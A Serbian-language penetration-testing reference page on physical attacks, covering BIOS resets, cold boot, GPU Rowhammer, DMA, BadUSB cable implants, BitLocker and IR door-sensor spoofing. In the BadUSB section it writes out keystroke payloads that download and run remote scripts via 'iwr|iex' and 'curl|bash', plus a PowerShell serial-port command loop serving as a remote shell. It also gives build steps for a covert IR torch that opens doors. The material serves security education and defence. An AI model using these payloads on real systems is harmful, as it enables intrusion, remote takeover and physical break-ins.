# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

## Oporavak BIOS lozinke i bezbednost sistema

Postavke firmware-a na starijim PC računarima mogu se resetovati odspajanjem CMOS baterije ili korišćenjem dokumentovanog clear-CMOS džampera. Potrebno vreme bez napajanja zavisi od ploče, a moderne UEFI lozinke ili ključevi mogu biti smešteni u nepromenljivoj flash memoriji, ugrađenom kontroleru ili bezbednosnom uređaju i zato preživeti uklanjanje baterije. Pre kratkog spajanja pinova konsultujte servisno uputstvo ploče; ovaj postupak takođe može učiniti TPM merenja nevažećim i pokrenuti oporavak disk-enkripcije.

Na starijim x86 sistemima, alati kao što su **killCMOS** i **CmosPwd** mogu pregledati ili izmeniti postavke sačuvane u CMOS-u iz bootabilnog okruženja. CmosPwd prepoznaje formate lozinki iz dokumentovanog skupa starijih BIOS familija i može napraviti rezervnu kopiju, vratiti ili obrisati/uništiti CMOS stanje; njegove objavljene verzije namenjene su starijim DOS/Windows, Linux, FreeBSD i NetBSD okruženjima.<sup>[[18]](#references)</sup> Ovi alati nisu univerzalni alati za uklanjanje UEFI lozinki i zahtevaju dovoljan pristup hardveru/firmware-u.

Neki laptop firmware-i prikazuju izazovni kod specifičan za proizvođača nakon nekoliko neuspešnih pokušaja unosa lozinke. Baze podataka kao što je [bios-pw.org](https://bios-pw.org) mogu izvesti nasumične lozinke za oporavak starijih sistema određenih proizvođača i modela, ali mnogi sistemi primenjuju zaključavanje bez izazova iz kojeg se može izvesti lozinka. Svaku generisanu lozinku tretirajte kao specifičnu za model i izbegavajte iscrpljivanje trajnih brojača pokušaja.

### UEFI bezbednost

Za moderne **UEFI** sisteme, CHIPSEC može proveriti zaštite Secure Boot promenljivih. Najpre pokrenite proveru koja ne menja sistem u nastavku; opcioni režim `-a modify` namerno pokušava da ošteti promenljive i treba ga koristiti samo na laboratorijskom sistemu koji se može oporaviti. CHIPSEC sam upozorava da njegov privilegovani drajver i pristup hardveru niskog nivoa nisu pogodni za produkcione krajnje uređaje.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## Analiza RAM memorije i Cold Boot napadi

DRAM ne gubi svaki bit odmah nakon prestanka osvežavanja. Brzina opadanja značajno varira u zavisnosti od tehnologije modula i temperature; hlađenje može očuvati korisne podatke mnogo duže nego nehlađeni ciklus isključivanja i uključivanja. Cold-boot napad brzo ponovo pokreće sistem u malom okruženju za akviziciju ili prenosi ohlađeni modul, snima sirovu memoriju i rekonstruiše kriptografske ključeve uprkos opadanju vrednosti bitova. Alat za kopiranje diska nije automatski i alat za snimanje fizičke memorije, a Volatility analizira snimak umesto da ga pribavlja; koristite validiran alat za akviziciju odgovarajući platformi.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer protiv page table struktura

Moderni GPU Rowhammer napadi postaju mnogo korisniji kada ciljaju **GPU virtual-memory metadata** umesto običnih bafera. Nedavni rad na **GDDR6 NVIDIA Ampere GPU-ovima** pokazuje da napadač koji izvršava neprivilegovani CUDA kod može da napravi GPU-specifične obrasce hammeringa, koristi **memory massaging** za postavljanje paging struktura u ranjive redove, a zatim izvrši bit flipove u **last-level page table** ili posrednom **page directory**. Kada se ošteti samo jedan translation entry, napadač može da uspostavi **arbitrary GPU memory read/write**, a zatim da pređe na kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Obrazac eksploatacije

1. **Profilisati redove podložne hammeringu** u GDDR6 memoriji i napraviti obrasce hammeringa koji uzimaju u obzir osvežavanje / nisu uniformni i zaobilaze mitigacije u DRAM-u.
2. **Izvršiti memory massaging GPU alokacija** tako da driver postavi page-translation strukture na fizičke lokacije podložne hammeringu, umesto da ih zadrži u podrazumevanom zaštićenom pool-u. U praksi to može značiti iscrpljivanje low-memory page-table regiona i raspršeno raspoređivanje velikih UVM mapiranja sa kontrolisanim koracima.
3. **Izvršiti bit flipove u translation metadata**, kao što su **PFN** ili bitovi povezani sa aperture-om unutar page-table / page-directory entry-ja, tako da virtualna stranica pod kontrolom napadača pokazuje na page-table stranice, proizvoljnu GPU memoriju ili system mapping-e vidljive hostu.
4. Ponovo iskoristiti falsifikovano mapiranje za izmenu dodatnih translation entry-ja i eskalirati do **arbitrary GPU memory read/write** kroz GPU kontekste.

### Prelazak na host i mitigacije

- Kada je **IOMMU onemogućen**, falsifikovana system-aperture mapiranja mogu izložiti proizvoljnu **host physical memory** GPU-u, pretvarajući GPU primitivu u potpunu kompromitaciju hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja last-level page-table entry-je, dok **GeForge** pokazuje da oštećivanje nivoa page directory-ja može biti jednostavnije, jer jedan bit flip može preusmeriti veće translation podstablo. Ne treba smatrati samo jedan paging sloj kritičnim za bezbednost.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan jer blokira direktan put do proizvoljne host memorije koji koriste GDDRHammer/GeForge, ali **nije potpuna mitigacija**. **GPUBreach** pokazuje second-stage pivot u kojem napadač oštećuje GPU-writable CPU baferе u vlasništvu drivera, a zatim aktivira memory-safety greške NVIDIA drivera kako bi dobio kernel write primitivu i **root shell** čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **System-level ECC** je praktičan korak za hardening na podržanim workstation/server GPU-ovima. Consumer GPU-ovi bez ECC-a pružaju slabiju odbrambenu površinu.<sup>[[4]](#references)</sup>
- Ovi napadi nisu samo teorijski: **GeForge** je prijavio **1.171** bit flip na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izgradnju funkcionalnog lanca eskalacije privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) napadi

Za offline UEFI IFR/NVRAM patching koji može da umanji pre-boot IOMMU enforcement i omogući Windows DMA lanac, pogledajte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstrira **DMA-based memory acquisition and patching** preko interfejsa kao što su FireWire i rane Thunderbolt konfiguracije, uključujući istorijske potpise za zaobilaženje prijavljivanja. Nije jednostavno „neefikasan protiv Windows 10“: mogućnost eksploatacije zavisi od interfejsa, build-a ciljnog sistema, IOMMU politike, stanja zaključavanja i toga da li je Windows Kernel DMA Protection podržan i omogućen. Windows 10 verzija 1803 i novije uvele su Kernel DMA Protection na kompatibilnim platformama, čime je attack surface značajno promenjen.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB za pristup sistemu

Na nešifrovanom ili već otključanom Windows volumenu, offline okruženje može zameniti accessibility binarne datoteke kao što su **sethc.exe** ili **Utilman.exe** sa **cmd.exe**, čime se dobija SYSTEM command prompt kada se pokrene odgovarajuća prečica na ekranu za prijavljivanje. Alati kao što je **chntpw** mogu menjati podatke lokalnih SAM naloga. Ove metode ne zaobilaze zaključan BitLocker volumen i mogu oštetiti kredencijale zaštićene pomoću DPAPI/EFS; sačuvajte forenzičke kopije i backup-e.

**Kon-Boot** je komercijalni boot-time authentication-bypass alat za podržane Windows/macOS konfiguracije. Kompatibilnost zavisi od OS-a, firmware režima, Secure Boot-a i podešavanja disk-enkripcije; ne dešifruje BitLocker-zaključan volumen.<sup>[[10]](#references)</sup>

---

## Rukovanje Windows bezbednosnim funkcijama

### Prečice za boot i recovery

- **Delete/Supr**, F2, F10 ili drugi vendor taster mogu otvoriti firmware setup.
- **F8** otvara legacy Windows advanced boot options samo na konfiguracijama na kojima je taj put i dalje omogućen; trenutni način ulaska u recovery zavisi od konfiguracije.
- Držanje tastera **Shift** može sprečiti Windows automatic logon u nekim konfiguracijama, iako policy/registry podešavanja mogu onemogućiti takvo ponašanje.<sup>[[17]](#references)</sup>

### BAD USB uređaji

Uređaji kao što su **USB Rubber Ducky** i Teensy ploče mogu da se registruju kao pouzdane HID tastature i ubacuju unapred definisane pritiske tastera. Payload u početku ima privilegije i pristup desktopu prijavljene sesije; UAC prompt-i, zaključavanje ekrana, raspored tastature, timing i endpoint USB policy i dalje ga ograničavaju.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator ili backup privilegije mogu kreirati shadow copy ili sačuvati registry hive-ove kako bi zaključane datoteke, kao što su **SAM** i **SYSTEM**, mogle biti pribavljene. Ovo je tehnika prikupljanja nakon kompromitacije, a ne zaobilaženje privilegija, i treba je povezati sa događajima `diskshadow`/VSS i izvozom registry hive-ova.

## BadUSB / HID Implant tehnike

### Wi-Fi managed cable implant-i

- Implant-i zasnovani na ESP32-S3, kao što je **Evil Crow Cable Wind**, skrivaju se unutar USB-A→USB-C ili USB-C↔USB-C kablova, registruju se isključivo kao USB tastatura i izlažu svoj C2 stack preko Wi-Fi-ja. Operator samo treba da napaja kabl sa victim hosta, kreira hotspot pod nazivom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) kako bi pristupio ugrađenom HTTP interfejsu.<sup>[[8]](#references)</sup>
- Browser UI pruža tabove *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payload-i označavaju se prema OS-u, rasporedi tastature menjaju se u hodu, a VID/PID stringovi mogu se izmeniti tako da oponašaju poznate periferije.
- Pošto se C2 nalazi unutar kabla, telefon može pripremiti payload-e, pokrenuti izvršavanje i upravljati Wi-Fi kredencijalima bez korišćenja mreže organizacije — korisno za fizičke upade kratkog trajanja.

### OS-aware AutoExec payload-i

- AutoExec pravila povezuju jedan ili više payload-a sa pokretanjem odmah nakon USB enumeracije. Implant izvršava osnovni OS fingerprinting i bira odgovarajuću skriptu.
- Primer workflow-a:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, obična zamena kabla za punjenje može obezbediti početni “plug-and-pwn” pristup u kontekstu prijavljenog korisnika.

### HID-bootstrapped remote shell preko Wi-Fi TCP-a

1. **Keystroke bootstrap:** Sačuvani payload otvara konzolu i lepi loop koji izvršava sve što stigne na novom USB serial uređaju. Minimalna Windows varijanta je:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP klijenta (Python skripta, Android APK ili desktop izvršna datoteka) ka operatoru. Svi bajtovi uneti u TCP sesiju prosleđuju se u prethodno opisani serijski kanal, čime se omogućava udaljeno izvršavanje komandi čak i na hostovima izolovanim od mreže. Izlaz je ograničen, pa operatori obično izvršavaju komande naslepo (kreiranje naloga, pripremanje dodatnih alata itd.).

### HTTP OTA površina za ažuriranje

- Dokumentovani Evil Crow Cable Wind interfejs izlaže neautentifikovani firmware-update endpoint na `/update`:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Terenski operateri mogu da menjaju funkcije u hodu (npr. flash USB Army Knife firmware) usred angažmana bez otvaranja kabla, što omogućava implantatu da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker enkripcije

Ovlašćeno forenzičko preuzimanje podataka sa aktivnog ili nedavno pokrenutog sistema može sadržati glavni ključ BitLocker volumena ili povezani ključni materijal dok je volumen otključan. Komercijalni alati kao što su Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic mogu pretraživati podržane memorijske slike, hibernacione datoteke ili crash dump-ove, ali uspeh nije zagarantovan. Savremeni Windows takođe enkriptuje crash dump-ove kada je BitLocker omogućen, a sačuvana recovery lozinka od 48 cifara predstavlja drugačiji artefakt od ključa volumena koji se nalazi u memoriji.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering za dodavanje recovery ključa

Napadač koji ubedi administratora da pokrene BitLocker-management komande može da doda recovery-password, external-key ili drugi protector, a zatim da ga preuzme. Recovery password ne može biti proizvoljan niz nula: BitLocker numeričke recovery password imaju validiran format od 48 cifara. Relevantna sintaksa za ovlašćenu administraciju je `manage-bde -protectors -add C: -recoverypassword`; dobijene protectors navedite pomoću `manage-bde -protectors -get C:`. Nadgledajte dodavanje protectors i obezbedite da se novi recovery materijal čuva samo na odobrenim lokacijama.<sup>[[16]](#references)</sup>

---

## Iskorišćavanje prekidača za detekciju otvaranja kućišta / održavanje radi vraćanja BIOS-a na fabrička podešavanja

Mnogi savremeni laptopovi i desktop računari malog formata imaju **prekidač za detekciju otvaranja kućišta** koji nadgledaju Embedded Controller (EC) i BIOS/UEFI firmware. Iako je primarna namena prekidača da podigne upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu recovery prečicu** koja se aktivira kada se prekidač preklopi po određenom obrascu.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Prekidač je povezan sa **GPIO interrupt-om** na EC-u.
2. Firmware koji radi na EC-u prati **vreme i broj pritisaka**.
3. Kada se prepozna hard-coded obrazac, EC poziva rutinu *mainboard-reset* koja **briše sadržaj sistemskog NVRAM/CMOS-a**.
4. Pri sledećem pokretanju, pogođeni modeli učitavaju resetovano stanje firmware-a. U zavisnosti od proizvođača i revizije, obrisano stanje može obuhvatati supervisorsku lozinku, prilagođena podešavanja pokretanja ili upisane Secure Boot ključeve; stanje TPM-a i efekte disk-enkripcije potrebno je proceniti odvojeno.

> Reset firmware-a može ponovo omogućiti opcije pokretanja sa eksternih uređaja, ali **ne dekriptuje skladište**. BitLocker ili drugi sistem za full-disk encryption može zahtevati recovery nakon promena TPM-a/firmware-a i i dalje štititi interni disk bez recovery ključa.<sup>[[16]](#references)</sup>

### Primer iz stvarnog sveta – Framework 13 Laptop

Recovery prečica za Framework 13 (11th/12th/13th-gen) je:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nakon desetog ciklusa, EC postavlja zastavicu koja nalaže BIOS-u da pri sledećem ponovnom pokretanju obriše NVRAM. Ceo postupak traje ~40 s i zahteva **samo odvijač**.<sup>[[5]](#references)</sup>

### Opšti postupak eksploatacije

1. Uključite metu ili izvršite suspend-resume kako bi EC bio pokrenut.
2. Uklonite donji poklopac da biste pristupili prekidaču za detekciju otvaranja/održavanje.
3. Ponovite obrazac prebacivanja specifičan za proizvođača (pogledajte dokumentaciju, forume ili izvršite reverse-engineering firmware-a EC-a).
4. Ponovo sastavite uređaj i pokrenite ga, a zatim proverite koja su se podešavanja firmware-a i kredencijali zaista promenili.
5. Ako imate ovlašćenje i dostupno je eksterno pokretanje, pokrenite kontrolisani live image. Kada je interni volume legitimno otključan (ili nikada nije bio enkriptovan), live okruženje može preuzeti kredencijale i podatke ili pregledati EFI System Partition. Izmena te particije radi instaliranja EFI implanta je perzistentna i veoma invazivna, a i dalje je ograničena funkcijama Secure Boot, measured boot, zaštitom od upisivanja u firmware i nadzorom endpointa. Enkriptovan storage ostaje nedostupan bez ključa ili materijala za oporavak.

### Detekcija i ublažavanje

* Beležite događaje otvaranja kućišta u OS management konzoli i korelišite ih sa neočekivanim BIOS resetovanjima.
* Koristite **plombe sa vidljivim tragom neovlašćenog otvaranja** na zavrtnjima/poklopcima radi detekcije otvaranja.
* Držite uređaje u **fizički kontrolisanim prostorima**; pretpostavite da fizički pristup znači potpunu kompromitaciju.
* Ako je dostupno, onemogućite funkciju proizvođača „maintenance switch reset“ ili zahtevajte dodatnu kriptografsku autorizaciju za NVRAM resetovanja.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Karakteristike senzora
- Komercijalni senzori za „izlaz mahanjem“ uparuju near-IR LED emiter sa prijemnim modulom nalik TV-daljinskom upravljaču, koji prijavljuje logic high tek nakon što detektuje više impulsa (~4–10) odgovarajućeg nosioca (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični štitnik sprečava da emiter i prijemnik gledaju direktno jedan u drugi, pa kontroler pretpostavlja da svaki validirani nosilac potiče od obližnje refleksije i aktivira relej koji otvara električni prihvatnik vrata.
- Kada kontroler zaključi da je meta prisutna, često menja envelope izlazne modulacije, ali prijemnik i dalje prihvata svaki burst koji odgovara filtriranom nosiocu.

### Tok napada
1. **Snimite profil emisije** – priključite logic analyzer preko pinova kontrolera kako biste zabeležili talasne oblike pre detekcije i nakon nje, koji pokreću interni IR LED.
2. **Reprodukujte samo talasni oblik „nakon detekcije“** – uklonite/zanemarite fabrički emiter i pokrenite eksterni IR LED već aktiviranim obrascem od samog početka. Pošto je prijemniku bitan samo broj impulsa/frekvencija, on lažni nosilac tretira kao autentičnu refleksiju i aktivira relejnu liniju.
3. **Ograničite prenos** – emitujte nosilac u podešenim burstovima (npr. nekoliko desetina milisekundi uključen, približno toliko isključen) kako biste isporučili minimalan broj impulsa bez zasićenja AGC-a prijemnika ili njegove logike za obradu smetnji. Kontinuirana emisija brzo smanjuje osetljivost senzora i sprečava aktiviranje releja.

### Reflektujuća injekcija velikog dometa
- Zamena laboratorijskog LED-a IR diodom velike snage, MOSFET driverom i fokusirajućom optikom omogućava pouzdano aktiviranje sa udaljenosti od ~6 m.
- Napadaču nije potrebna direktna vidljivost do otvora prijemnika; usmeravanje snopa ka unutrašnjim zidovima, policama ili okvirima vrata koji su vidljivi kroz staklo omogućava da reflektovana energija uđe u vidno polje od ~30° i imitira mahanje rukom iz neposredne blizine.
- Pošto prijemnici očekuju samo slabe refleksije, mnogo snažniji eksterni snop može se odbiti od više površina i i dalje ostati iznad praga detekcije.

### Weaponised Attack Torch
- Ugradnja drivera u komercijalnu baterijsku lampu skriva alat svima na vidiku. Zamenite vidljivi LED IR LED-om velike snage koji odgovara opsegu prijemnika, dodajte ATtiny412 (ili sličan MCU) za generisanje burstova od ≈30 kHz i upotrebite MOSFET za odvod struje LED-a.
- Teleskopsko zoom sočivo sužava snop radi dometa/preciznosti, dok vibracioni motor pod kontrolom MCU-a pruža haptičku potvrdu da je modulacija aktivna bez emitovanja vidljive svetlosti.
- Cikliranje kroz nekoliko sačuvanih obrazaca modulacije (neznatno različite frekvencije nosioca i envelope) povećava kompatibilnost sa različitim rebrendiranim porodicama senzora, omogućavajući operateru da pretražuje reflektujuće površine dok relej čujno ne klikne i vrata se ne otvore.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Press here to pwn“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Vodič za resetovanje matične ploče](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Plug, Play, Pwn: Hacking with Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Cold Boot Attacks on Encryption Keys](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - physical memory manipulation over DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
